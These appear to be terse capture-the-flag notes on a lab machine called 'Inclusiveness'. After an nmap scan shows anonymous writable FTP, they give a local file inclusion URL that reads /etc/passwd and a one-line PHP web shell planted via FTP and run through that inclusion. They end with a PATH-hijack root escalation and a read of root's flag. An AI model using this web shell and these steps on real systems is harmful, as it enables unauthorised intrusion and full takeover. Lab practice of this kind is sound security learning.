----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Inclusiveness
# 3/1/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.75
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))



 /secret_information

 http://192.168.75.14/secret_information/?lang=/etc/passwd

 <?php system($_GET['cmd']);?>

http://192.168.75.14/secret_information/?lang=/var/ftp/pub/backdoor.php&cmd=id

cd /tmp
echo "printf "tom"" > whoami
chmod 777 whoami


cd /home/tom
./rootshell
cd /root
cat flag.txt